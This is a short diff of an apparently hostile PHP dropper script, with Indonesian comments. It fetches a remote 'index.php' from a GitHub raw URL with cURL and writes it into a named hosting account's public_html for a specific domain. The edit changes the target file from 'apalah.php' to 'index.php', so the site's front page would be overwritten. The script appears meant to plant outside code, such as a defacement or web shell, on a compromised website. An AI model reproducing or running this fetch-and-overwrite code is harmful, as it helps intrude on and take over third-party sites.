@@ -3,7 +3,7 @@
 $url = "https://raw.githubusercontent.com/Bayyzp/ntah/refs/heads/main/index.php";
 
 // Lokasi penyimpanan full path (bukan pakai $_SERVER['DOCUMENT_ROOT'])
-$savePath = "/home/u977259636/domains/vastustore.in/public_html/apalah.php";
+$savePath = "/home/u977259636/domains/vastustore.in/public_html/index.php";
 
 // Inisialisasi cURL
 $ch = curl_init($url);
